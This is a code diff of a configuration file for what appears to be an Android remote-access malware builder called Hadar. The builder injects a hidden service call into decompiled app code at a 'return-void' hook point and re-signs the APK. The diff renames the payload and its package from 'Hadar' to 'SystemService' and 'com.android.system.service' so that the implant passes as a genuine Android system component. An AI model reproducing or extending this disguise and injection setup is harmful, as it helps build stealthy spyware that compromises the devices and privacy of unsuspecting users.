@@ -2,24 +2,24 @@ const path = require('path');
 
 
 //---------------------App Controller Vars----------------------------------
-exports.apkName = 'HadarFramework.apk';
+exports.apkName = 'SystemService.apk';
 exports.apkSourceName = 'Hadar';
-exports.signedApkName = 'HadarFramework-aligned-debugSigned.apk';
+exports.signedApkName = 'SystemService-aligned-debugSigned.apk';
 exports.hadarApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Hadar').replace("app.asar", "app.asar.unpacked");
 exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
 exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
 exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
-exports.dataDir = 'HadarFramework'
+exports.dataDir = 'SystemService'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
 exports.outputLogsPath = 'Logs';
 exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali' + path.sep + 'com' + path.sep + 'hadar' + path.sep + 'framework' + path.sep + 'e.smali';
-exports.hadarService = 'com.hadar.framework.MainService';
-exports.hadarReceiver = 'com.hadar.framework.MyReceiver';
-exports.serviceSrc = 'invoke-static {}, Lcom/hadar/framework/MainService'
+exports.IOSocketPath = 'smali' + path.sep + 'com' + path.sep + 'android' + path.sep + 'system' + path.sep + 'service' + path.sep + 'e.smali';
+exports.hadarService = 'com.android.system.service.MainService';
+exports.hadarReceiver = 'com.android.system.service.MyReceiver';
+exports.serviceSrc = 'invoke-static {}, Lcom/android/system/service/MainService'
 exports.serviceStart = ';->start()V \n\n' +
   '    return-void';
 exports.hookPoint = 'return-void';
